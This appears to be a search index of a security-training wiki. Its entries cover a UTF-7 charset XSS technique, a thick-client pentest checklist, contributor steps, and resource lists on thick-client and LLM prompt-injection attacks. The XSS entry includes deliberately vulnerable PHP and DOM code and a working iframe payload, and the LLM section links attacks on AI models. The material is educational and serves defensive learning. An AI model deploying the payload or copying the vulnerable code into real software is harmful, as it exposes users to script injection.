[{"id":0,"href":"/docs/","title":"Docs","section":"Cyber Security Wiki by Payatu","content":" Categories # Application Security Cloud Security DevSecOps Exploit Development IoT Security Machine Learning Network Red Teaming Threat Modelling "},{"id":1,"href":"/docs/application-security/web/charset-xss/","title":"Charset XSS","section":"Web","content":" Charset XSS # Charset XSS is useful in cases where application filters HTML special characters like \u0026lt; \u0026amp; \u0026gt;, You might have seen these characters converting back into \u0026amp;gt; \u0026amp; \u0026amp;lt; respectively.\nFor example consider the following codes\n\u0026lt;?php if(isset($_GET[\u0026#39;xss\u0026#39;])) { echo htmlspecialchars($_GET[\u0026#39;xss\u0026#39;]); } ?\u0026gt; and similarly for DOM XSS code\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;test page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var bad_string = window.location.hash.substring(1); var regex = /\u0026lt;\\\u0026gt;/gi; var good_string = bad_string.replace(regex,\u0026#39;\u0026#39;) document.write(good_string); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; using charset XSS it is possible to bypass html special characters filtration\nRequirements # Target site not implemented charset Target site implemented the wrong charset Example works in IE-11 # Consider the same DOM XSS code\nxss.html \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;test page\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var bad_string = window.location.hash.substring(1); var regex = /\u0026lt;\\\u0026gt;/gi; var good_string = bad_string.replace(regex,\u0026#39;\u0026#39;) document.write(good_string); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Since this page does not have any charset defines that means it fulfil the requirements for charset XSS. In order to do it, we will create a document with UTF-7 encoding and load the vulnerable URL in the iframe.\niframe.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-7\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;iframe src=\u0026#34;http://lab.com:8888/common/c.html#\u0026lt;p\u0026gt;+ADw-svg/onload+AD0-alert(1444444)+AD4-\u0026lt;/p\u0026gt;\u0026#34; frameborder=\u0026#34;1\u0026#34; height=\u0026#34;300\u0026#34; width=\u0026#34;500\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; As soon as we access iframe.html we triage javaScript code execution since xss.html doesn\u0026rsquo;t have any charset defined and hence browser inherit top frame\u0026rsquo;s charset which is UTF-7.\n"},{"id":2,"href":"/docs/application-security/thick-client/checklist/","title":"Checklist","section":"Thick Client","content":" Checklist # Reconnaisance (Information Gathering) # Information Gathering (via tool like CFF Explorer) Identify architecture - Two-tier or Three-tier Is the App - Internet or Intranet based (via tool like Wireshark) Identify - Proxy-aware or Proxy-Unaware Identify technologies used on Client-Side Identify technologies used on Server-Side Identify the Proccess ID Identify application entry points Identify user roles Identify Network Communication - Ports and Protocols in use Port Scanning (via tool like Nmap) Check for webapp associated with the thick client Check whether thick client app redirects to a web application Injection # OS Command Injection SQL Injection NoSQL Injection External XML Entity (XXE) XSS (Cross Site Scripting) HTML Injection XPath Injection LDAP Injection Host Header Injection CSV Injection (HTTP) Parameter Pollution Server-Side Template Injection (SSTI) Broken Authentication and Session Management # Vulnerable Authentication Flow via Response Manipulation via SQL/NoSQL Injection Via Null (Absence of) Password Use of Default Credentials Use of Hardcoded Credentials Via Memory Manipulation Via Registry Manipulation Username Enumeration Weak Lock Out Mechanism Flawed Brute-Force Protection Vulnerable Remember Password Weak Password Policy Flawed User Registration Process OAuth/OpenID SSO MFA Session based weaknesses Sensitive Data Exposure # Improper cryptographic key management Presence of sensitive data in log files Presence of sensitive data in local files Presence of sensitive data in registry Presence of sensitive data in config files Presence of hard-coded sensitive data in source code Presence of sensitive data in memory Sensitive Data Persists in Memory after Formal Logout Improper Cryptography Usage # Missing encryption Use of Weak cryptographic Keys Weak Cryptography (encryption) algorithm implemented (in Authentication) Use of old/less-secure Hashing algorithms Use of Hash values without Salting Insufficient randomness for cryptographic functions/keys Improper Authorization (Broken Access Control) # Privilege Escalation Via enabling hidden functionalities Via enabling objects (eg. text fields, buttons) Via disabling objects (eg. text fields, buttons) Via Parameter manipulation Weak file/folder permission per user role Read/Write access of the registry Read/Write access of the configuration files Read/Write access of the log files Via Memory Manipulation Via Registry Manipulation Horizontal Privilege Escalation Vertical Privilege Escalation Analyze setuid/setgid permission Forced Browsing Insecure Direct Object References (IDOR) URL/Open Redirection Path/Directory Traversal Read/Write permission for App Directory or Files Tampering cookies/sesssions JWT Based Attacks Security Misconfiguration # Improper Error Handling (verbose messages) Absent/weakly configured security headers Cross-Origin Resource Sharing (CORS) Misconfiguration Server Banner Information Disclosure HTTP Request Smuggling Check for unquoted service paths Unnecessarily exposed features (ports, services, pages, accounts, or privileges). CAPTCHA Unicode Normalization Path normalization issues Unrestricted File Upload Insecure Communication # Sensitive data transmitted in plain text (eg. Database Queries) Usage of plaintext communication protocols (eg. FTP, TELNET, HTTP, MQTT, WS) SSL Vulnerabilities Weak SSL/DTLS cipher Weak SSL/DTSL protocol SSL cipher expired/about to expire Self signed certificate Certificate signed with a weak hashing algorithm Insecure implementation of certificate validation HTTPS not enabled HTTPS not enforced Analyze and/or bypass firewall rules Poor Code Quality # Verify StrongNaming (signing an assembly with a key) Check for missing Code-Signing and Verification checks (for File Integrity) Reverse Engineering Decompile the application Rebuild the application Patch the application Bypass licence/validation check Race Condition Lack Of Binary Protections Check for HighEntropyVA Is ASLR (Address Space Layout Randomization) enabled Is DEP (Data Execution Prevention) enabled Is SafeSEH (Safe Structured Exception Handlers) enabled Is CFG (Control Flow Guard) enabled Lack of Code Obfuscation DLL Injection DLL proxying Buffer Overflow Stack Buffer Overflow Heap Buffer Overflow Using Components with known vulnerabilities # Using Component with Known Vulnerabilities Using unmaintained/obsolete libraries Insufficient logging and monitoring # Logs (containing sensitive data) publiclly available Log Injection/Forging Logging Sensitive information Lack of logging important information Side Channel Data Leaks Miscellaneous # Application Debuggable Analyze the Dump File Business Logic (Application Specific) Bypassing license/extending lifetime of trial software via register manipulation Payment Manipulation String based analysis Server-Side attacks SSRF Local File Inclusion (LFI) Remote File Inclusion (RFI) Denial Of Service attack (DOS) "},{"id":3,"href":"/contribute/","title":"Contribute","section":"Cyber Security Wiki by Payatu","content":" Contribute # Hey There! Looks like you are here for contributing to the wiki\u0026hellip;Let me help you with a few pointers!\nThe aim of this open-source project to create a central repository for all the cybersecurity content, which can be consumed by security researchers and newbies in the field. You can add content related to any field and this is also a great place to showcase the content you have created. The scope of the project is whatever you think can help out folks get started in the cyber security. We have hosted everything on to Github, click on the button and it will take you to Github Contribute Structure # The structure is required for uniformity, so here are a few template, to help you curate the content.\nThe _index.md file acts as the index for that specific directory. To add a new category A category is the high level overview. For example - \u0026ldquo;Application Security\u0026rdquo; is a category.\nSteps - Create a new directory in docs directory. Add a new file inside the newly created directory called _index.md with the following content in it.\n--- title: \u0026lt;!-- Category Name Here. --\u0026gt; bookCollapseSection: true --- \u0026lt;!-- Your content here. --\u0026gt; a new category will be created.\nEach Category will contain an images/ folder.\nDirectory Structure -\ncontent/ ├─ docs/ │ ├─ category-name/ │ │ ├─ images/ │ │ ├─ _index.md Create a New Sub Category To create a sub category in side a category, we need to create a directory inside the main category, which will contain all the different markdown files of different content.\n--- title: \u0026lt;!-- SubCategory Name Here. --\u0026gt; bookCollapseSection: true --- \u0026lt;!-- Your content here. --\u0026gt; To add a new page Each page will contain the following content -\n--- title: \u0026lt;!-- Title of the page here. --\u0026gt; --- \u0026lt;!-- Your content here. --\u0026gt; Images can be used in each page by using the complete link - content/docs/\u0026lt;category-name\u0026gt;/images/\u0026lt;image-name\u0026gt;.\u0026lt;extension\u0026gt; Example -\n![Alt text](content/docs/cloud-security/images/image.png) Infrastructure # The wiki is built on the Hugo. If you can help with any improvements, feature additions, etc. You can create an Issue and we can discuss it over there.\nAdditional Features # Linking an Internal Document {{ \u0026lt;/* relref \u0026#34;\u0026lt;!-- document/path/here --\u0026gt;\u0026#34; */\u0026gt; }} It will help hugo internally process the document easily.\nOther cool elements to be added can be found in the shortcode section.\nTest Locally # Clone the repository to make changes locally -\ngit clone git@github.com:payatu/cybersec-wiki.git git submodule init git submodule update Install Hugo Extended Latest Version.\nFrom the parent location of repository where the source code is, run\nhugo server It will start a local server to test the changes that you have made, in terms of look, feel and content.\nOnce satisfied with the changes made, push the changes to GitHub, it will ask you to create a fork of the repository and make changes there.\nCreate a Pull Request and if everything looks fine, the payatu team will be merging the content to the Cyber Security Wiki.\n"},{"id":4,"href":"/docs/application-security/thick-client/learningprocess/","title":"Learning Process","section":"Thick Client","content":" Learning Resources # Contents # Sample vulnerable thick client applications Vulnerability ranking Common Vulnerabilities Video Reference Sample vulnerable Thick Client application # DVTA - Damn Vulnerable Thick Client Application # https://github.com/srini0x00/dvta\nhttps://www.hackingarticles.in/thick-client-pentest-lab-setup-dvta-2/ https://www.hackingarticles.in/thick-client-pentest-lab-setup-dvta-part-2/ https://parsiya.net/blog/2018-07-15-dvta-part-1-setup/ BetaBank # https://github.com/NetSPI/BetaFast/tree/master/BetaBank\nBetaFast # https://github.com/NetSPI/BetaFast/tree/master/BetaFast\nhttps://medium.com/@abhishek.offsec/hacking-the-betafast-betabank-thick-client-applications-fe8b6226f84a OWASP Desktop App Security Top 10 # https://owasp.org/www-project-desktop-app-security-top-10/\nSome Common Vulnerabilities # https://payatu.com/blog/thick-client-penetration-testing/\nDLL Hijacking\nhttps://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking https://hackerone.com/reports/1636566 https://securitycafe.ro/2023/06/19/dll-hijacking-finding-vulnerabilities-in-pestudio-9-52/ DLL Side-loading\nhttps://www.mandiant.com/resources/reports/dll-side-loading-thorn-side-anti-virus-industry Sensitive credentials leaked in source code on Github\nhttps://thehackernews.com/2023/01/github-breach-hackers-stole-code.html Application data being stored in System Registry\nhttps://www.praetorian.com/blog/how-to-detect-and-dump-credentials-from-the-windows-registry/ https://medium.com/@rahisul/windows-registry-769191adce1e Unsigned .exe or .dll files\nhttps://abhigowdaa.medium.com/unsigned-dll-exe-files-the-validity-of-the-certificates-86baf8722454 Unencrypted application data in network during transmission\nUse of Wireshark to analyze traffic https://www.netspi.com/blog/technical/thick-application-penetration-testing/introduction-to-hacking-thick-clients-part-2-the-network/ Unecrypted application data stored in the computer\nhttps://blog.appsecco.com/breaking-bad-tearing-apart-a-thick-client-app-to-steal-data-7e44f8698b2a https://stackoverflow.com/questions/33288/protecting-api-secret-keys-in-a-thick-client-application Memory protection checks\nhttps://blog.securelayer7.net/static-analysismemory-forensics-reverse-engineering-thick-client-penetration-testing-part-4/ https://msrc.microsoft.com/blog/2010/12/on-the-effectiveness-of-dep-and-aslr/ https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-memory-protection-features/ba-p/259046 Symlink attack\nhttps://www.exploit-db.com/papers/13199 https://www.darkrelay.com/post/thick-client-penetration-testing https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/ SQL Injection\nSQLi payload for different languages can be referred from - https://securecode.wiki/docs/lang/dotnet/ Video reference # Cobalt Core Academy: Thick Client Pentesting with Harsh Bothra "},{"id":5,"href":"/docs/machine-learning/learning/","title":"Learning Process","section":"Machine Learning","content":" Contents # OWASP Top 10 for Large Language Model Applications Prompt Injection Articles Prompt Injection Videos Prompt Injection CTF LLM Hacker Handbook Videos AI Attack Surface Map Research Papers OWASP Top 10 for Large Language Model Applications # https://owasp.org/www-project-top-10-for-large-language-model-applications/ Prompt Injection Articles # https://josephthacker.com/ai/2023/04/19/prompt-injection-and-mitigations.html https://josephthacker.com/ai/2023/08/25/prompt-injection-primer.html https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/ https://www.lakera.ai/insights/what-is-prompt-injection Prompt Injection Videos # Attacking LLM - Prompt Injection Accidental LLM Backdoor - Prompt Tricks Defending LLM - Prompt Injection Prompt Injection 101 - Understanding Security Risks in LLM Prompt Injection CTF # GPT Prompt Attack Double Speak Chat LLM Hacker Handbook # https://doublespeak.chat/#/handbook Videos # AI Hacking 🔥 OWASP Top 10 Vulnerabilities in LLM Applications Fredrik Heiding - Devising and Detecting Phishing: Large Language Models vs. Smaller Human Models Daniel Miessler and Rez0: Hacking with AI (Ep. 24) AI and hacking - opportunities and threats - Joseph “rez0” Thacker AI Attack Surface Map # The AI Attack Surface Map v1.0 Research Papers # Prompt Injection attack against LLM-integrated Applications Exploiting Programmatic Behavior of LLMs: Dual-Use Through Standard Security Attacks Universal and Transferable Adversarial Attacks on Aligned Language Models "},{"id":6,"href":"/docs/application-security/thick-client/tools/","title":"Tools","section":"Thick Client","content":" Tools used in Thick client pentesting # Information Gathering # CFF explorer SysInternal Suite Strings Process Monitor Process Explorer Sigcheck Decompile and Debug # DnSpy ILSpy DotPeek Frida Network sniffing and Proxy # Wireshark TCPView EchoMirage Burp Suite NoPE proxy Fiddler "}]